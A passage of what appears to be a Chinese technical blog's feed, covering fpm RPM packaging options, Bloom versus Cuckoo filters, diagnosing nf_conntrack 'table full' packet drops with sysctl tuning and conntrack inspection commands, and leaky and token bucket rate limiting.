目录，则最后打包安装的目录信息为 /usr/loca/bin/；</span><br><span class="line">-t :指定需要制作成什么包,可选项有：<span class="string">&quot;rpm&quot;</span> <span class="string">&quot;deb&quot;</span> <span class="string">&quot;solaris&quot;</span> <span class="string">&quot;puppet&quot;</span> <span class="string">&quot;dir&quot;</span> <span class="string">&quot;osxpkg&quot;</span> <span class="string">&quot;p5p&quot;</span> <span class="string">&quot;puppet&quot;</span> <span class="string">&quot;sh&quot;</span> <span class="string">&quot;solaris&quot;</span> <span class="string">&quot;tar&quot;</span> <span class="string">&quot;zip&quot;</span></span><br><span class="line">--description  :软件包描述</span><br><span class="line">--conflicts:指定冲突软件</span><br><span class="line">--url:指定站点[例如:<span class="string">&quot;http://www.cnblog.com/roach57&quot;</span> ]</span><br><span class="line">--verbose:安装过程详细打印</span><br><span class="line">--after-install   :包安装之后执行的脚本 也可写作 --post-install FILE</span><br><span class="line">--before-install  :包安装之前执行的脚本 </span><br><span class="line">--after-remove    :包卸载之后执行的脚本</span><br><span class="line">--before-remove   :包卸载之前执行的脚本</span><br><span class="line">--after-upgrade   :包更新之后执行的脚本[仅支持 deb 和 rpm 这两种包]</span><br><span class="line">--before-upgrade  :包更新之前执行的脚本</span><br><span class="line">--iteration       :发布序号[就是rpm包里面的release]</span><br><span class="line">--epoch           :纪元</span><br><span class="line">--no-rpm-sign     :不使用rpm签名   Signature</span><br><span class="line">--license         :证书许可 [可选项有 <span class="string">&#x27;BSD(开源软件)&#x27;</span> <span class="string">&#x27;GPLv2(自由软件)&#x27;</span> <span class="string">&#x27;MIT&#x27;</span> <span class="string">&#x27;Public Domain(公共域)&#x27;</span> <span class="string">&#x27;Distributable(贡献)&#x27;</span> <span class="string">&#x27;commercial(商业)&#x27;</span> <span class="string">&#x27;Share(共享)等&#x27;</span>,一般的开发都写<span class="string">&#x27;BSD&#x27;</span>或<span class="string">&#x27;GPL&#x27;</span>]</span><br><span class="line">--vendor          :供应商名称 [ --vendor <span class="string">&#x27;admin@fpm.com&#x27;</span>]</span><br><span class="line">--no-depends      :代表没有任何依赖包,和-d是对立的,不能共用</span><br><span class="line">--config-files    :指定配置文件,可以指定目录[递归]</span><br><span class="line">--directories     :指定包目录</span><br><span class="line">--category        :软件所属的类别，参考SPEC文件中的Group配置项</span><br></pre></td></tr></table></figure><h3 id="2-3、打包实践"><a href="#2-3、打包实践" class="headerlink" title="2.3、打包实践"></a>2.3、打包实践</h3><ul><li><p>初始目录信息：</p><ul><li><code>/data/test/</code>目录列表为：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`-- usr</span><br><span class="line">    `-- <span class="built_in">local</span></span><br><span class="line">        `-- bin</span><br><span class="line">            `-- sh</span><br><span class="line">                `-- install.sh</span><br><span class="line">                `-- remove.sh</span><br><span class="line">                `-- run.sh</span><br></pre></td></tr></table></figure><ul><li><code>/data/out/</code>目录为空；</li><li><code>/usr/local/bin/sh</code>目录不存在；</li></ul></li><li><p>打包脚本如下所示：</p></li><li><pre><code class="bash">fpm -f -s dir -t rpm -n mysh \-v 1.5 \--iteration 6 \-C /data/test/ \-p /data/out/ \--description &#39;This is mysh rpm&#39; \--url &#39;http://www.mysh.com&#39; \--after-install /data/test/usr/local/bin/sh/install.sh \--after-remove /data/test/usr/local/bin/sh/remove.sh<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+ 执行脚本后日志信息为：</span><br><span class="line"></span><br><span class="line">+ ```bash</span><br><span class="line">  Created package &#123;:path=&gt;&quot;/data/out/mysh-1.5-6.x86_64.rpm&quot;&#125;</span><br></pre></td></tr></table></figure></code></pre></li><li><p>本地安装指定的rpm包：</p></li><li><pre><code class="bash">yum localinstall -y /data/out/mysh-1.5-6.x86_64.rpm</code></pre></li><li><p>本地的<code>/usr/local/bin/sh</code>目录中可查看到指定的三个sh文件；</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> RPM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bloom Filter和Cuckoo Filter对比解析</title>
      <link href="/2019/08/12/bloom-and-cuckoo-filter/"/>
      <url>/2019/08/12/bloom-and-cuckoo-filter/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Bloom-Filter"><a href="#一、Bloom-Filter" class="headerlink" title="一、Bloom Filter"></a>一、Bloom Filter</h2><p><code>Bloom Filter</code>（布隆过滤器）是<code>1970</code>年由布隆提出的，它由一个二进制向量数组和一系列随机映射函数组成。它可以用于检索一个元素是否<strong>一定不在集合中</strong>或者<strong>可能存在集合中</strong>。</p><ul><li><a href="http://www.dragonwins.com/domains/getteched/bbc/literature/Bloom70.pdf">《Space&#x2F;Time Trade-offs in Hash Coding with Allowable Errors》</a></li></ul><h3 id="1-1、实现原理"><a href="#1-1、实现原理" class="headerlink" title="1.1、实现原理"></a>1.1、实现原理</h3><ul><li><strong>初始化内存区域</strong>：在内存中开辟一块储存空间，并将里面的比特位全部初始化为<code>0</code>；</li><li><strong>设置k个hash函数</strong>：初始化<code>k</code>个<code>hash</code>函数，用于元素的数据映射；</li><li><strong>比特位映射</strong>：通过<code>k</code>个<code>hash</code>函数，将元素映射到存储空间对应的比特位，并将对应的比特位设置为<code>1</code>；</li></ul><p><img src="https://cdn.bugwz.com/bloom-filter-principle.png" alt="原理图"></p><h3 id="1-2、优缺点"><a href="#1-2、优缺点" class="headerlink" title="1.2、优缺点"></a>1.2、优缺点</h3><ul><li><strong>优点</strong>：<ul><li>散列函数相互之间没有关系，方便由硬件并行实现；</li><li>不需要存储元素本身，在某些对保密要求非常严格的场合有优势；</li></ul></li><li><strong>缺点</strong>：<ul><li>布隆过滤器存储空间和插入&#x2F;查询时间都是<code>O(k)</code>，导致查询性能较弱；</li><li>误算率随着存入的元素数量增多而不断增加；</li><li>由于不能确定某个元素是否一定存在，因此无法删除元素；</li><li>空间利用效率低；</li></ul></li></ul><h2 id="二、Cuckoo-Filter"><a href="#二、Cuckoo-Filter" class="headerlink" title="二、Cuckoo Filter"></a>二、Cuckoo Filter</h2><p><code>Cuckoo Filter</code>（布谷鸟过滤器）使用一维数组存储元素的指纹信息（会存在误判率），同时使用两个 hash 函数获得指纹的<code>位置id</code>，在每个位置可以放置多个座位。这两个 <code>hash 函数</code>选择的比较特殊，因为过滤器中只能存储指纹信息。当这个位置上的指纹被挤兑之后，它需要计算出另一个对偶位置，下面会单独对这<code>两个hash函数</code>进行解析。</p><ul><li><p><a href="https://www.cs.cmu.edu/~dga/papers/cuckoo-conext2014.pdf">《Cuckoo Filter: Practically Better Than Bloom》</a></p></li><li><p><a href="https://github.com/efficient/cuckoofilter">Cuckoo Filter C 库</a></p></li></ul><h3 id="2-1、实现原理"><a href="#2-1、实现原理" class="headerlink" title="2.1、实现原理"></a>2.1、实现原理</h3><ul><li><strong>初始化内存</strong>：初始化一块内存给一维数组<code>Buckets</code>，其中每个<code>Bucket</code>有<code>n</code>个位置可供使用，每个位置存储对应元素的指纹信息，即每个<code>Bucket</code>中可供存储<code>n</code>个元素的指纹信息；</li><li><strong>Bucket映射</strong>：通过<code>两个Hash</code>函数得到两个对应的位置点（<code>p1</code>和<code>p2</code>）信息，尝试将对应元素的指纹信息存入指定的Bucket中，如果<code>p1</code>对应的<code>Bucket</code>已经填充满了，则尝试填充到<code>p2</code>对应的<code>Bucket</code>中；</li><li><strong>元素指纹挤兑</strong>：当两个位置点（<code>p1</code>和<code>p2</code>）对应的<code>Bucket</code>都已经填充满了就会触发填充挤兑，从<code>p1</code>和<code>p2</code>对应的<code>Bucket</code>中随机选择一个进行挤兑操作，将<code>Bucket</code>中的已经存在的指纹信息踢除（被踢除的指纹信息会存储到它可存储的另一个<code>Bucket</code>中，如果另一个<code>Bucket</code>中也没有了位置，则又会触发挤兑操作，直到达到挤兑操作的上限），然后将该指纹信息存储到当前的<code>Bucket</code>中；</li></ul><h4 id="2-1-1、一维数组的特性"><a href="#2-1-1、一维数组的特性" class="headerlink" title="2.1.1、一维数组的特性"></a>2.1.1、一维数组的特性</h4><p>布谷鸟过滤器强制一维数组的长度必须是 <code>2 的指数</code>，所以对数组的长度取模等价于取 hash 值的最后 n 位。在进行异或运算时，忽略掉低 n 位 之外的其它位就行。将计算出来的位置 p 保留低 n 位就是最终的对偶位置。</p><h4 id="2-1-2、两个hash函数的特性"><a href="#2-1-2、两个hash函数的特性" class="headerlink" title="2.1.2、两个hash函数的特性"></a>2.1.2、两个hash函数的特性</h4><p>因为布谷鸟过滤器中只存储指纹信息，当这个位置上的指纹被挤兑之后，它需要计算出另一个对偶位置，而计算这个对偶位置是需要元素本身的，但是布谷鸟过滤器巧妙的设计了一个独特的 <code>hash函数</code>，使得可以根据 <code>p1</code> 和 <code>元素指纹</code> 直接计算出 <code>p2</code>，而不需要完整的 <code>x 元素</code>。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fp = fingerprint(x)</span><br><span class="line">p1 = <span class="built_in">hash</span>(x)</span><br><span class="line">p2 = p1 ^ <span class="built_in">hash</span>(fp)  // 异或</span><br></pre></td></tr></table></figure><p><img src="https://cdn.bugwz.com/cuckoo-filter-principle.png" alt="原理图"></p><h3 id="2-2、优缺点"><a href="#2-2、优缺点" class="headerlink" title="2.2、优缺点"></a>2.2、优缺点</h3><ul><li><strong>优点</strong>：<ul><li>查询性能较高；</li><li>空间利用率较高；</li><li>保证了一个比特只被一个元素映射，所以允许删除操作；</li></ul></li><li><strong>缺点</strong>：<ul><li>不能完美的支持删除，存在误删的情况；</li><li>存储空间的大小必须为2的指数的限制让空间效率打了折扣；</li></ul></li></ul><h3 id="2-3、场景分析"><a href="#2-3、场景分析" class="headerlink" title="2.3、场景分析"></a>2.3、场景分析</h3><h4 id="2-3-1、相同元素多次连续插入"><a href="#2-3-1、相同元素多次连续插入" class="headerlink" title="2.3.1、相同元素多次连续插入"></a>2.3.1、相同元素多次连续插入</h4><p>假设每个<code>Bucket</code>的可供存储的座位为<code>4</code>，那么当相同的元素多次连续插入之后，<code>Cuckoo Filter</code>会对同一个元素进行了挤兑循环操作，导致同一个元素的指纹会占用<code>两个</code>位置上的所有的<code>8个座位</code>，导致空间利用率较低。</p><h4 id="2-3-2、误删情况"><a href="#2-3-2、误删情况" class="headerlink" title="2.3.2、误删情况"></a>2.3.2、误删情况</h4><p>由于存在不同元素被hash到同一个位置的情况，以及不同元素指纹相同的情况，所以会存在一定的误判率。</p><p>参考链接：<a href="https://juejin.im/post/5cfb9c74e51d455d6d5357db">https://juejin.im/post/5cfb9c74e51d455d6d5357db</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次nf_conntrack模块导致的丢包问题</title>
      <link href="/2019/08/10/nf-conntrack/"/>
      <url>/2019/08/10/nf-conntrack/</url>
      
        <content type="html"><![CDATA[<h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>我们灰度线上业务的时候，有一次遇到了业务反馈资源没有读写，当时正好将流量切到了线上的一台机器上，在将业务的资源迁移回滚之后，经过一番查找，发现<code>/var/log/message</code>中打印了很多关于<code>kernel: nf_conntrack: table full, dropping packet</code>的错误信息，网上查找了一下，这个错误主要是由于启用了<code>nf_conntrack模块</code>，之前很多人都遇到了这个问题，解决方案也很多，这里以我的角度详细记录一下，<code>/var/log/message</code>中错误信息如下：</p><figure class="highlight v"><table><tr><td class="code"><pre><span class="line">Jul <span class="number">30</span> <span class="number">11</span>:<span class="number">50</span>:<span class="number">01</span> dbl14192 systemd: Starting Session <span class="number">486429</span> of user root.</span><br><span class="line">Jul <span class="number">30</span> <span class="number">11</span>:<span class="number">50</span>:<span class="number">02</span> dbl14192 kernel: nf_conntrack: <span class="keyword">table</span> full, dropping packet</span><br><span class="line">Jul <span class="number">30</span> <span class="number">11</span>:<span class="number">50</span>:<span class="number">02</span> dbl14192 kernel: nf_conntrack: <span class="keyword">table</span> full, dropping packet</span><br><span class="line">Jul <span class="number">30</span> <span class="number">11</span>:<span class="number">50</span>:<span class="number">02</span> dbl14192 kernel: nf_conntrack: <span class="keyword">table</span> full, dropping packet</span><br><span class="line">Jul <span class="number">30</span> <span class="number">11</span>:<span class="number">50</span>:<span class="number">02</span> dbl14192 kernel: nf_conntrack: <span class="keyword">table</span> full, dropping packet</span><br><span class="line">Jul <span class="number">30</span> <span class="number">11</span>:<span class="number">50</span>:<span class="number">02</span> dbl14192 kernel: nf_conntrack: <span class="keyword">table</span> full, dropping packet</span><br><span class="line">Jul <span class="number">30</span> <span class="number">11</span>:<span class="number">50</span>:<span class="number">02</span> dbl14192 kernel: nf_conntrack: <span class="keyword">table</span> full, dropping packet</span><br><span class="line">Jul <span class="number">30</span> <span class="number">11</span>:<span class="number">50</span>:<span class="number">02</span> dbl14192 kernel: nf_conntrack: <span class="keyword">table</span> full, dropping packet</span><br><span class="line">Jul <span class="number">30</span> <span class="number">11</span>:<span class="number">50</span>:<span class="number">02</span> dbl14192 kernel: nf_conntrack: <span class="keyword">table</span> full, dropping packet</span><br><span class="line">Jul <span class="number">30</span> <span class="number">11</span>:<span class="number">50</span>:<span class="number">02</span> dbl14192 kernel: nf_conntrack: <span class="keyword">table</span> full, dropping packet</span><br><span class="line">Jul <span class="number">30</span> <span class="number">11</span>:<span class="number">50</span>:<span class="number">02</span> dbl14192 kernel: nf_conntrack: <span class="keyword">table</span> full, dropping packet</span><br><span class="line">Jul <span class="number">30</span> <span class="number">11</span>:<span class="number">50</span>:<span class="number">07</span> dbl14192 kernel: net_ratelimit: <span class="number">3626</span> callbacks suppressed</span><br></pre></td></tr></table></figure><h3 id="1-1、原因-x2F-复现"><a href="#1-1、原因-x2F-复现" class="headerlink" title="1.1、原因&#x2F;复现"></a>1.1、原因&#x2F;复现</h3><p>由于启用了<code>nf_conntrack模块</code>，业务短链接请求访问量大，由于conntrack采用默认的配置参数，短时间内导致conntrack的连接追踪表达到<code>65536*4=262144</code>默认的最大限制，新的连接无法建立，导致大量的丢包，业务因此无法正常访问；</p><ul><li><p>短连接为什么也会导致爆表？</p><ul><li>针对于各种协议的各种连接状态，连接追踪表中会保留对应的记录一段时间，具体时间可参考下文中的详细配置值，因此短链接又可能也会爆表；</li></ul><p><img src="https://cdn.bugwz.com/conntrack.png" alt="nf_conntrack爆表分析"></p></li></ul><p>后续尝试使用<code>redis-benchmark</code>进行<code>client为400000</code>的<code>短链接</code>压测却未能复现，原因是操作系统启用了端口复用（对应参数：<code>/proc/sys/net/ipv4/tcp_tw_reuse</code>），并且单机的socket连接数限制在65535，对于启用了<code>conntrack模块</code>的链接追踪表来说，测试的时候，记录的连接数不会超过65536，后续将<code>/proc/sys/net/netfilter/nf_conntrack_max</code>参数调小之后，稳定复现。</p><h3 id="1-2、修复"><a href="#1-2、修复" class="headerlink" title="1.2、修复"></a>1.2、修复</h3><p>如何避免再次出现这种问题，一下提供两种方式可供参考：</p><ul><li>禁用模块：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo iptables -t raw -A OUTPUT -j NOTRACK</span><br><span class="line">sudo iptables -t raw -A PREROUTING -j NOTRACK</span><br></pre></td></tr></table></figure><ul><li>调整<code>nf_conntrack_max</code>：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysctl -w net.netfilter.nf_conntrack_max = 65536000</span><br></pre></td></tr></table></figure><h2 id="二、conntrack模块"><a href="#二、conntrack模块" class="headerlink" title="二、conntrack模块"></a>二、conntrack模块</h2><p>nf_conntrack模块在kernel 2.6.15（2006-01-03 发布） 被引入，支持IPv4 和IPv6，取代只支持IPv4 的ip_connktrack，用于跟踪一个连接的状态。连接状态跟踪可以供其他模块使用，最常见的两个使用场景是 iptables 的 nat 的 state 模块。</p><h3 id="2-1、模块管理"><a href="#2-1、模块管理" class="headerlink" title="2.1、模块管理"></a>2.1、模块管理</h3><p>nf_conntrack模块对应存在一个管理工具：<a href="https://git.netfilter.org/conntrack-tools">conntrack-tools</a>，该工具可手动安装，它是一款基于GNU &#x2F; Linux的免费软件工具，允许系统管理员从用户空间与内核中的<a href="http://people.netfilter.org/pablo/docs/login.pdf">连接跟踪系统进行</a>交互，该软件主要提供两个具体的工具：</p><ul><li><code>conntrack</code>：通过使用命令行指令提供比直接使用<code> /proc/net/ip_conntrack</code>更灵活的接口来管理连接跟踪系统。通过使用conntrack指令，您可以显示&#x2F;删除&#x2F;更新现有的状态条目，同时也可以监听流事件；</li><li><code>conntrackd</code>：用户空间连接跟踪守护程序，可用于部署容错GNU&#x2F;Linux防火墙，也可以使用它来收集防火墙中流的相关统计信息；</li></ul><h3 id="2-2、模块配置信息"><a href="#2-2、模块配置信息" class="headerlink" title="2.2、模块配置信息"></a>2.2、模块配置信息</h3><p>官方详细介绍地址：<a href="https://www.kernel.org/doc/Documentation/networking/nf_conntrack-sysctl.txt">https://www.kernel.org/doc/Documentation/networking/nf_conntrack-sysctl.txt</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启用连接跟踪流记帐。每个流添加64位字节和数据包计数器。(BOOLEAN：默认为零)</span></span><br><span class="line">nf_conntrack_acct</span><br><span class="line"><span class="comment"># 哈希表的大小，如果在模块加载期间未指定该参数，则通过将总内存除以16384来计算默认大小以确定存储区的数量，但是哈希表将永远不会少于32并且限制为16384个存储区。 对于内存超过4GB的系统，它将是65536个桶。 此sysctl只能在初始网络命名空间中写入。（INTEGER）</span></span><br><span class="line">nf_conntrack_buckets</span><br><span class="line"><span class="comment"># 验证传入数据包的校验和。校验和错误的数据包处于INVALID状态。如果启用此选项，则不会考虑此类数据包进行连接跟踪。(BOOLEAN：默认为非零)</span></span><br><span class="line">nf_conntrack_checksum</span><br><span class="line"><span class="comment"># 当前分配的流条目数（INTEGER）</span></span><br><span class="line">nf_conntrack_count</span><br><span class="line"><span class="comment"># 如果启用此选项，连接跟踪代码将通过ctnetlink为用户空间提供连接跟踪事件。（BOOLEAN：默认为非零）</span></span><br><span class="line">nf_conntrack_events</span><br><span class="line"><span class="comment"># 期望表的最大大小。 默认值为nf_conntrack_buckets/256，最小值为1。（INTEGER）</span></span><br><span class="line">nf_conntrack_expect_max</span><br><span class="line"><span class="comment"># 用于重组IPv6片段的最大内存。 当为此目的分配nf_conntrack_frag6_high_thresh字节的内存时，片段处理程序将抛出数据包，直到达到nf_conntrack_frag6_low_thresh。（INTEGER：默认是262144）</span></span><br><span class="line">nf_conntrack_frag6_high_thresh</span><br><span class="line"><span class="comment"># 参见nf_conntrack_frag6_low_thresh（INTEGER：默认是196608）</span></span><br><span class="line">nf_conntrack_frag6_low_thresh</span><br><span class="line"><span class="comment"># 将IPv6片段保留在内存中的时间（INTEGER：单位秒）</span></span><br><span class="line">nf_conntrack_frag6_timeout</span><br><span class="line"><span class="comment"># 通用超时的默认值。 这指的是第4层未知/不支持的协议。（INTEGER：默认为600，单位秒）</span></span><br><span class="line">nf_conntrack_generic_timeout</span><br><span class="line"><span class="comment"># 启用自动conntrack帮助程序分配。如果禁用，则需要设置iptables规则以将帮助程序分配给连接。 有关详细信息，请参阅iptables-extensions（8）手册页中的CT目标描述。</span></span><br><span class="line">nf_conntrack_helper</span><br><span class="line"><span class="comment"># ICMP超时时间（INTEGER：默认为30秒）</span></span><br><span class="line">nf_conntrack_icmp_timeout</span><br><span class="line"><span class="comment"># ICMP6超时时间（INTEGER：默认为30秒）</span></span><br><span class="line">nf_conntrack_icmpv6_timeout</span><br><span class="line"><span class="comment"># 记录value指定类型的无效数据包（INTEGER）</span></span><br><span class="line">nf_conntrack_log_invalid</span><br><span class="line"><span class="comment"># 连接跟踪表的大小（INTEGER：默认为nf_conntrack_buckets * 4）</span></span><br><span class="line">nf_conntrack_max</span><br><span class="line"><span class="comment"># 在你所做的事情上保守一点，在你接受别人的事情上保持自由。如果它不是零，我们只将窗口RST段标记为无效（BOOLEAN：默认为零）</span></span><br><span class="line">nf_conntrack_tcp_be_liberal</span><br><span class="line"><span class="comment"># 如果设置为零，我们将禁用拾取已建立的连接（BOOLEAN：默认为非零）</span></span><br><span class="line">nf_conntrack_tcp_loose</span><br><span class="line"><span class="comment"># 在未收到来自目标的（可接受）ACK的情况下可以重新传输的最大数据包数。 如果达到此数量，将启动更短的计时器（INTEGER：默认为3）</span></span><br><span class="line">nf_conntrack_tcp_max_retrans</span><br><span class="line"><span class="comment"># TCP连接状态为close的记录超时时间（INTEGER：默认为10秒）</span></span><br><span class="line">nf_conntrack_tcp_timeout_close</span><br><span class="line"><span class="comment"># TCP连接状态为close_wait的记录超时时间（INTEGER：默认为60秒）</span></span><br><span class="line">nf_conntrack_tcp_timeout_close_wait</span><br><span class="line"><span class="comment"># TCP连接状态为established的记录超时时间（INTEGER：默认为432000秒）</span></span><br><span class="line">nf_conntrack_tcp_timeout_established</span><br><span class="line"><span class="comment"># TCP连接状态为fin_wait的记录超时时间（INTEGER：默认为120秒）</span></span><br><span class="line">nf_conntrack_tcp_timeout_fin_wait</span><br><span class="line"><span class="comment"># TCP连接状态为last_ack的记录超时时间（INTEGER：默认为30秒）</span></span><br><span class="line">nf_conntrack_tcp_timeout_last_ack</span><br><span class="line"><span class="comment"># （INTEGER：默认为300秒）</span></span><br><span class="line">nf_conntrack_tcp_timeout_max_retrans</span><br><span class="line"><span class="comment"># TCP连接状态为syn_recv的记录超时时间（INTEGER：默认为60秒）</span></span><br><span class="line">nf_conntrack_tcp_timeout_syn_recv</span><br><span class="line"><span class="comment"># TCP连接状态为syn_sent的记录超时时间（INTEGER：默认为120秒）</span></span><br><span class="line">nf_conntrack_tcp_timeout_syn_sent</span><br><span class="line"><span class="comment"># TCP连接状态为syn_sent的记录超时时间（INTEGER：默认为120秒）</span></span><br><span class="line">nf_conntrack_tcp_timeout_time_wait</span><br><span class="line"><span class="comment"># （INTEGER：默认为300秒）</span></span><br><span class="line">nf_conntrack_tcp_timeout_unacknowledged</span><br><span class="line"><span class="comment"># （BOOLEAN：默认为零）</span></span><br><span class="line">nf_conntrack_timestamp</span><br><span class="line"><span class="comment"># （INTEGER：默认为30秒）</span></span><br><span class="line">nf_conntrack_udp_timeout</span><br><span class="line"><span class="comment"># （INTEGER：默认为120秒）</span></span><br><span class="line">nf_conntrack_udp_timeout_stream</span><br><span class="line"><span class="comment"># （INTEGER：默认为30秒）</span></span><br><span class="line">nf_conntrack_gre_timeout</span><br><span class="line"><span class="comment"># 如果检测到GRE流，将使用此扩展超时（INTEGER：默认为180秒）</span></span><br><span class="line">nf_conntrack_gre_timeout_stream</span><br></pre></td></tr></table></figure><h2 id="三、相关指令"><a href="#三、相关指令" class="headerlink" title="三、相关指令"></a>三、相关指令</h2><ul><li><p>conntrack内核参数列表：<code>sudo sysctl -a | grep conntrack</code>；</p></li><li><p>conntrack超时相关参数：<code>sudo sysctl -a | grep conntrack | grep timeout</code>；</p></li><li><p>conntrack跟踪表的大小（桶的数量）：<code>sudo sysctl net.netfilter.nf_conntrack_buckets</code>；</p></li><li><p>conntrack最大跟踪连接数：<code>sudo sysctl net.netfilter.nf_conntrack_max</code>；</p></li><li><p>netfilter模块加载时的默认值：<code>sudo dmesg | grep conntrack</code>；</p></li><li><p>conntrack跟踪表使用情况：<code>sudo sysctl net.netfilter.nf_conntrack_count</code>；</p></li><li><p>四层协议类型和连接数：<code>sudo cat /proc/net/nf_conntrack | awk &#39;&#123;sum[$3]++&#125; END &#123;for(i in sum) print i, sum[i]&#125;&#39;</code>；</p></li><li><p>TCP 连接各状态对应的条数：<code>sudo cat /proc/net/nf_conntrack | awk &#39;/^.*tcp.*$/ &#123;sum[$6]++&#125; END &#123;for(i in sum) print i, sum[i]&#125;&#39;</code>；</p></li><li><p>三层协议类型和连接数：<code>sudo cat /proc/net/nf_conntrack | awk &#39;&#123;sum[$1]++&#125; END &#123;for(i in sum) print i, sum[i]&#125;&#39;</code>；</p></li><li><p>连接数最多的10个IP地址：<code>sudo cat /proc/net/nf_conntrack | awk &#39;&#123;print $7&#125;&#39; | cut -d &quot;=&quot; -f 2 | sort | uniq -c | sort -nr | head -n 10</code>；</p></li></ul><h2 id="四、相关链接"><a href="#四、相关链接" class="headerlink" title="四、相关链接"></a>四、相关链接</h2><ul><li><p><a href="https://git.netfilter.org/conntrack-tools">https://git.netfilter.org/conntrack-tools</a></p></li><li><p><a href="http://conntrack-tools.netfilter.org/manual.html">http://conntrack-tools.netfilter.org/manual.html</a></p></li><li><p><a href="https://www.slideserve.com/liseli/linux-kernel-2-4-conntrack">https://www.slideserve.com/liseli/linux-kernel-2-4-conntrack</a></p></li><li><p><a href="http://keithmo.me/post/2018/08/25/conntrack-tuning/">http://keithmo.me/post/2018/08/25/conntrack-tuning/</a></p></li><li><p><a href="https://testerhome.com/topics/15824">https://testerhome.com/topics/15824</a></p></li><li><p><a href="https://clodfisher.github.io/2018/09/nf_conntrack/">https://clodfisher.github.io/2018/09/nf_conntrack/</a></p></li><li><p><a href="https://blog.csdn.net/yaopeng_2005/article/details/7064869">https://blog.csdn.net/yaopeng_2005/article/details/7064869</a></p></li><li><p><a href="https://xmoyking.github.io/2017/06/20/iptables/">https://xmoyking.github.io/2017/06/20/iptables/</a></p></li><li><p><a href="https://my.oschina.net/u/232595/blog/1919450">https://my.oschina.net/u/232595/blog/1919450</a></p></li><li><p><a href="https://blog.csdn.net/iteye_21199/article/details/82278402">https://blog.csdn.net/iteye_21199/article/details/82278402</a></p></li><li><p><a href="https://blog.csdn.net/dhRainer/article/details/83411428">https://blog.csdn.net/dhRainer/article/details/83411428</a></p></li><li><p><a href="https://blog.csdn.net/jasonchen_gbd/article/details/44874321">https://blog.csdn.net/jasonchen_gbd/article/details/44874321</a></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Iptables </tag>
            
            <tag> nf_conntrack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏桶与令牌桶速率限制算法</title>
      <link href="/2019/07/01/leaky-and-token-bucket/"/>
      <url>/2019/07/01/leaky-and-token-bucket/</url>
      
        <content type="html"><![CDATA[<h2 id="一、漏桶算法"><a href="#一、漏桶算法" class="headerlink" title="一、漏桶算法"></a>一、漏桶算法</h2><p>漏桶算法(<code>Leaky Bucket</code>)是网络世界中流量整形（<code>Traffic Shaping</code>）或速率限制（<code>Rate Limiting</code>）时经常使用的一种算法，它的主要目的是控制数据注入到网络的速率，平滑网络上的突发流量。漏桶算法提供了一种机制，通过它，突发流量可以被整形以便为网络提供一个稳定的流量。示意图如下所示：</p><p><img src="https://cdn.bugwz.com/Leaky-Bucket.png" alt="Leaky Bucket"></p><h3 id="1-1、算法过程"><a href="#1-1、算法过程" class="headerlink" title="1.1、算法过程"></a>1.1、算法过程</h3><ul><li><code>数据包入队列</code>：数据包按照一定的顺序存储入用于临时存储的缓存队列（数据桶）中；</li><li><code>数据包等待或溢出</code>：数据包在缓存队列（数据桶）中等待一段时间，或者如果此时缓存队列（数据桶）已经达到存储的上限，数据包溢出（被丢弃）；</li><li><code>数据包出队列</code>：将缓存队列（数据桶）中的数据包按照固定的速率依次出队列并进行处理；</li></ul><h3 id="1-2、特点"><a href="#1-2、特点" class="headerlink" title="1.2、特点"></a>1.2、特点</h3><ul><li>优点：<ul><li>能够强行限制数据的传输速率；</li><li>保证严格的延迟界限；</li></ul></li><li>缺点：<ul><li>对突发性的流量缺乏处理效率；</li></ul></li></ul><h3 id="1-3、相关项目"><a href="#1-3、相关项目" class="headerlink" title="1.3、相关项目"></a>1.3、相关项目</h3><ul><li>Nginx中关于漏桶的设计与实现：<code>ngx_http_limit_req_module</code> 模块中的<code>ngx_http_limit_req_lookup</code>函数（位于<code>./src/http/modules/ngx_http_limit_req_module.c</code>）；</li></ul><h2 id="二、令牌桶算法"><a href="#二、令牌桶算法" class="headerlink" title="二、令牌桶算法"></a>二、令牌桶算法</h2><p>令牌桶算法（<code>Token Bucket</code>）是网络流量整形（<code>Traffic Shaping</code>）和速率限制（<code>Rate Limiting</code>）中最常使用的一种算法。典型情况下，令牌桶算法用来控制发送到网络上的数据的数目，并允许突发数据的发送。示意图如下所示：</p><p><img src="https://cdn.bugwz.com/Token-Bucket.png" alt="Token Bucket"></p><h3 id="2-1、算法过程"><a href="#2-1、算法过程" class="headerlink" title="2.1、算法过程"></a>2.1、算法过程</h3><ul><li><p><code>产生令牌</code>：周期性的以速率CIR&#x2F;EIR向令牌桶中增加令牌，桶中的令牌不断增多，如果桶中令牌数已到达CBS&#x2F;EBS，则丢弃多余令牌；</p></li><li><p><code>消耗令牌</code>：输入数据包会消耗桶中的令牌，在网络传输中，数据包的大小通常不一致，大的数据包相较于小的数据包消耗的令牌要多；</p></li><li><p><code>判断是否通过</code>：输入数据包经过令牌桶后的结果包括输出的数据包和丢弃的数据包，当桶中的令牌数量可以满足数据包对令牌的需求，则将数据包输出，否则将其丢弃；</p></li></ul><h3 id="2-2、特点"><a href="#2-2、特点" class="headerlink" title="2.2、特点"></a>2.2、特点</h3><ul><li><p>优点：</p><ul><li>允许一定程度突发流量传输；</li></ul></li><li><p>缺点：</p><ul><li>可能会存在一些误判；</li></ul></li></ul><h3 id="2-3、相关项目"><a href="#2-3、相关项目" class="headerlink" title="2.3、相关项目"></a>2.3、相关项目</h3><ul><li><a href="https://github.com/google/guava">Guava</a>中的<a href="https://guava.dev/releases/19.0/api/docs/index.html?com/google/common/util/concurrent/RateLimiter.html">RateLimiter</a>；</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
            <tag> SpeedLimit </tag>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
